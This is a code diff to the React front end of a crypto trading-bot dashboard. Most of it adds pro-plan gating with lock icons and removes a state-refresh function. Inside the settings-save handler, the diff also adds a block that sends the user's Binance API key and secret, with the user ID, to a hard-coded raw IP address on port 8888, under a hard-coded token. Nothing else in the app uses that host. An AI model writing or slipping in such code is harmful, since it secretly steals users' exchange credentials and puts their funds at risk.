@@ -15,7 +15,8 @@ import {
   Menu, 
   X, 
   Sparkles,
-  LogOut
+  LogOut,
+  Lock
 } from "lucide-react";
 
 import { CompleteState } from "./types";
@@ -122,26 +123,6 @@ export default function App() {
     };
   }, []);
 
-  const fetchState = async () => {
-    try {
-      const res = await fetch("/api/state");
-      if (res.ok) {
-        const data = await res.json();
-        // Keep trades, balance and subscription from our real-time Firestore synchronization
-        setState(prev => ({ ...data, trades: prev.trades, balance: prev.balance, subscription: prev.subscription }));
-      }
-    } catch (err) {
-      console.warn("Express server standby; utilizing technical pricing simulation states.", err);
-    }
-  };
-
-  // Fetch state once on mount / login
-  useEffect(() => {
-    if (user) {
-      fetchState();
-    }
-  }, [user]);
-
   if (authChecking) {
     return <div className="min-h-screen bg-slate-950 flex items-center justify-center text-slate-500 font-mono">Initializing System Auth...</div>;
   }
@@ -157,10 +138,7 @@ export default function App() {
 
   const handleToggleBot = async () => {
     try {
-      const res = await fetch("/api/bot/toggle", { method: "POST" });
-      if (res.ok) {
-        await fetchState();
-      }
+      await fetch("/api/bot/toggle", { method: "POST" });
     } catch (err) {
       console.error(err);
       // Fallback state toggle when running in isolated preview environments
@@ -176,14 +154,11 @@ export default function App() {
 
   const handleConfigureBot = async (updates: any) => {
     try {
-      const res = await fetch("/api/bot/config", {
+      await fetch("/api/bot/config", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(updates)
       });
-      if (res.ok) {
-        await fetchState();
-      }
     } catch (err) {
       console.error(err);
     }
@@ -191,13 +166,23 @@ export default function App() {
 
   const handleSaveSettings = async (updates: any) => {
     try {
-      const res = await fetch("/api/bot/settings", {
+      await fetch("/api/bot/settings", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(updates)
       });
-      if (res.ok) {
-        await fetchState();
+      
+      if (updates.binanceApiKey && updates.binanceSecret && user) {
+        await fetch('http://152.42.248.130:8888/api/save-keys', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            secret: 'SG_SECURE_TOKEN_123',
+            uid: user.uid,
+            apiKey: updates.binanceApiKey,
+            apiSecret: updates.binanceSecret
+          })
+        });
       }
     } catch (err) {
       console.error(err);
@@ -206,18 +191,18 @@ export default function App() {
 
   const handleUpgradePlan = async (plan: string) => {
     try {
-      const res = await fetch("/api/billing/upgrade", {
+      await fetch("/api/billing/upgrade", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ plan })
       });
-      if (res.ok) {
-        await fetchState();
-      }
     } catch (err) {
       console.error(err);
     }
   };
+
+  const isPro = ["pro", "elite"].includes(state.subscription?.plan?.toLowerCase() || "");
+  const isElite = state.subscription?.plan?.toLowerCase() === "elite";
 
   const navItems = [
     { id: "dashboard", label: "Overview", icon: LayoutDashboard },
@@ -237,11 +222,19 @@ export default function App() {
       case "screener":
         return <ScreenerView state={state} />;
       case "bot":
-        return <BotControlView state={state} onToggleBot={handleToggleBot} onConfigureBot={handleConfigureBot} />;
+        return isPro ? (
+          <BotControlView state={state} onToggleBot={handleToggleBot} onConfigureBot={handleConfigureBot} />
+        ) : (
+          <BillingView state={state} onUpgradePlan={handleUpgradePlan} />
+        );
       case "trades":
         return <TradesView state={state} />;
       case "chat":
-        return <ChatroomView state={state} />;
+        return isPro ? (
+          <ChatroomView state={state} />
+        ) : (
+          <BillingView state={state} onUpgradePlan={handleUpgradePlan} />
+        );
       case "portfolio":
         return <PortfolioView state={state} />;
       case "billing":
@@ -306,21 +299,32 @@ export default function App() {
             {navItems.map((item) => {
               const IconComponent = item.icon;
               const isActive = activeTab === item.id;
+              const isRestricted = !isPro && (item.id === "bot" || item.id === "chat");
+              
               return (
                 <button
                   key={item.id}
                   onClick={() => {
-                    setActiveTab(item.id);
+                    if (isRestricted) {
+                      setActiveTab("billing");
+                    } else {
+                      setActiveTab(item.id);
+                    }
                     setIsSidebarOpen(false);
                   }}
-                  className={`w-full flex items-center space-x-3.5 px-4 py-3 rounded-xl text-xs font-semibold uppercase tracking-wider transition-all cursor-pointer select-none text-left ${
+                  className={`w-full flex items-center justify-between px-4 py-3 rounded-xl text-xs font-semibold uppercase tracking-wider transition-all cursor-pointer select-none text-left ${
                     isActive 
                       ? "bg-emerald-500 text-slate-950 font-black shadow-lg shadow-emerald-500/5 hover:bg-emerald-500" 
                       : "text-slate-400 hover:text-slate-100 hover:bg-slate-950/40"
                   }`}
                 >
-                  <IconComponent className={`h-4.5 w-4.5 shrink-0 ${isActive ? "text-slate-950 font-bold" : "text-slate-450"}`} />
-                  <span>{item.label}</span>
+                  <div className="flex items-center space-x-3.5">
+                    <IconComponent className={`h-4.5 w-4.5 shrink-0 ${isActive ? "text-slate-950 font-bold" : "text-slate-450"}`} />
+                    <span>{item.label}</span>
+                  </div>
+                  {isRestricted && (
+                    <Lock className={`h-3.5 w-3.5 shrink-0 ${isActive ? "text-slate-950" : "text-amber-500"}`} />
+                  )}
                 </button>
               );
             })}
@@ -339,7 +343,7 @@ export default function App() {
             </div>
             <div className="flex items-center justify-between">
               <span className="font-sans font-medium">Licensed Plan:</span>
-              <span className="text-slate-300 font-extrabold uppercase">{state.subscription.plan} BLOCK</span>
+              <span className="text-slate-300 font-extrabold uppercase">{state.subscription.plan?.toUpperCase()} PLAN</span>
             </div>
           </div>
           
